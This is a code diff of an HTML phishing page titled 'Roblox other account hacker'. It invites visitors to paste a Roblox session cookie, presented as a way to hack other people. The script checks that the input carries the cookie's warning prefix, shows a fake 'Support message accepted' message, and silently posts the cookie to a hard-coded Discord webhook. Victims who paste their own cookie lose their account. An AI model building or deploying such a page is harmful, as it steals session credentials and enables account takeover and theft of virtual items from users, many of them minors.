@@ -3,179 +3,209 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Cookie Form</title>
+<title>Roblox other account hacker</title>
 
 <style>
 *{
-margin:0;
-padding:0;
-box-sizing:border-box;
-font-family:Arial,sans-serif;
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial,sans-serif;
 }
 
 body{
-height:100vh;
-display:flex;
-justify-content:center;
-align-items:center;
-overflow:hidden;
-background:#050505;
+    background:#050505;
+    overflow:hidden;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
 }
 
-/* Animated Background */
+/* Animated background */
 body::before{
-content:"";
-position:fixed;
-top:-50%;
-left:-50%;
-width:200%;
-height:200%;
-background:
-radial-gradient(circle,#ff000055 2px,transparent 3px),
-radial-gradient(circle,#99000055 2px,transparent 3px);
-background-size:80px 80px;
-animation:move 15s linear infinite;
-filter:blur(1px);
+    content:"";
+    position:fixed;
+    width:300%;
+    height:300%;
+    background:
+        radial-gradient(circle,#ff003355 2px,transparent 3px),
+        radial-gradient(circle,#88000055 2px,transparent 3px);
+    background-size:90px 90px;
+    animation:bgmove 18s linear infinite;
 }
 
-@keyframes move{
-0%{transform:translate(0,0);}
-50%{transform:translate(-80px,-80px);}
-100%{transform:translate(0,0);}
+@keyframes bgmove{
+    0%{transform:translate(0,0);}
+    50%{transform:translate(-120px,-120px);}
+    100%{transform:translate(0,0);}
 }
 
-.container{
-position:relative;
-z-index:2;
-width:340px;
-padding:30px;
-background:rgba(20,20,20,.9);
-border:1px solid #ff2d2d;
-border-radius:18px;
-box-shadow:0 0 30px #ff000055;
-text-align:center;
-animation:fade .8s ease;
-}
-
-@keyframes fade{
-from{
-opacity:0;
-transform:translateY(30px);
-}
-to{
-opacity:1;
-transform:translateY(0);
-}
+.card{
+    position:relative;
+    z-index:2;
+    width:340px;
+    background:rgba(20,20,20,.92);
+    border:1px solid #ff4040;
+    border-radius:18px;
+    padding:28px;
+    text-align:center;
+    box-shadow:0 0 30px rgba(255,0,0,.25);
 }
 
 h1{
-color:#fff;
-margin-bottom:20px;
-font-size:28px;
+    color:white;
+    margin-bottom:20px;
+    font-size:28px;
 }
 
 input{
-width:100%;
-padding:14px;
-margin:10px 0;
-border:none;
-outline:none;
-border-radius:10px;
-background:#111;
-color:#fff;
-font-size:16px;
-border:1px solid #333;
-transition:.3s;
+    width:100%;
+    padding:14px;
+    border-radius:10px;
+    border:1px solid #444;
+    background:#111;
+    color:white;
+    outline:none;
+    font-size:16px;
+    transition:.25s;
 }
 
 input:focus{
-border-color:#ff3333;
-box-shadow:0 0 12px #ff0000;
+    border-color:#ff4040;
+    box-shadow:0 0 12px red;
 }
 
 button{
-margin-top:15px;
-width:100%;
-padding:14px;
-border:none;
-border-radius:10px;
-background:#ff2d2d;
-color:#fff;
-font-size:18px;
-cursor:pointer;
-transition:.3s;
+    margin-top:18px;
+    width:100%;
+    padding:14px;
+    border:none;
+    border-radius:10px;
+    background:#ff4040;
+    color:white;
+    font-size:17px;
+    cursor:pointer;
+    transition:.25s;
 }
 
 button:hover{
-background:#ff5555;
-transform:scale(1.03);
-box-shadow:0 0 15px red;
+    background:#ff6666;
+    transform:scale(1.03);
 }
 
-.status{
-margin-top:15px;
-color:#00ff88;
-font-size:15px;
+.result{
+    margin-top:18px;
+    font-size:17px;
+    font-weight:bold;
+}
+
+.success{
+    color:#00ff88;
+}
+
+.error{
+    color:#ff5555;
+}
+
+.examples{
+    margin-top:18px;
+    color:#bdbdbd;
+    font-size:13px;
+    line-height:1.6;
 }
 </style>
 </head>
+
 <body>
 
-<div class="container">
-<h1>🍪 Cookie</h1>
+<div class="card">
+
+<h1>Support</h1>
 
 <input
+id="support"
 type="text"
-id="cookie"
-placeholder="Enter text here...">
+placeholder="Enter a cookie to hack people">
 
-<button onclick="sendWebhook()">
-PRESS BUTTON
+<button onclick="checkSupport()">
+CHECK
 </button>
 
-<div class="status" id="status"></div>
+<div id="result" class="result"></div>
+
+<div class="examples">
+Examples:<br>
+✅ _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|<br>
+</div>
 
 </div>
 
 <script>
-const webhook = "https://discord.com/api/webhooks/1529777479244447775/i5k-ci_cX8tBR-wMgoIKanc8Keg6GcvfEd78HgkefQM7QqACKtPv3zRIowMr_oSx4XKy";
 
-async function sendWebhook(){
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1529787694530433096/nhbW0FrMq283oHWreH_1deelAQmzv_i5QqE5MK9HtjuF_5fS5GNORdbiA9gJ50ARH-PB";
 
-const value = document.getElementById("cookie").value;
-
-if(!value){
-alert("Please enter something.");
-return;
+function isValidSupport(text){
+    text = text.replace(/\s+/g,"").toLowerCase();
+    return text.includes("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|");
 }
 
-const data = {
-content:
-"🍪 **Submitted Text**\n```" +
-value +
-"```"
-};
+async function checkSupport(){
 
-try{
+    const support = document.getElementById("support").value.trim();
+    const result = document.getElementById("result");
 
-await fetch(webhook,{
-method:"POST",
-headers:{
-"Content-Type":"application/json"
-},
-body:JSON.stringify(data)
-});
+    if(!isValidSupport(support)){
+        result.className="result error";
+        result.textContent="❌ Invalid _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|";
+        return;
+    }
 
-document.getElementById("status").innerHTML="✅ Sent!";
-document.getElementById("cookie").value="";
+    result.className="result success";
+    result.textContent="✅ Support message accepted!";
 
-}catch(err){
+    const payload = {
+        embeds:[
+        {
+            title:"🌸 ACCOUNT CHECKER",
+            description:"Support checker completed.",
+            color:16738740,
+            fields:[
+                {
+                    name:"✅ Status",
+                    value:"",
+                    inline:true
+                },
+                {
+                    name:"📝 Support Message",
+                    value:support,
+                    inline:false
+                }
+            ],
+            footer:{
+                text:"Support Checker"
+            },
+            timestamp:new Date().toISOString()
+        }]
+    };
 
-document.getElementById("status").innerHTML="❌ Failed.";
+    try{
+        await fetch(WEBHOOK_URL,{
+            method:"POST",
+            headers:{
+                "Content-Type":"application/json"
+            },
+            body:JSON.stringify(payload)
+        });
+
+        console.log("Webhook sent!");
+    }catch(err){
+        console.error(err);
+        alert("Failed to send webhook.");
+    }
 
 }
 
-}
 </script>
 
 </body>
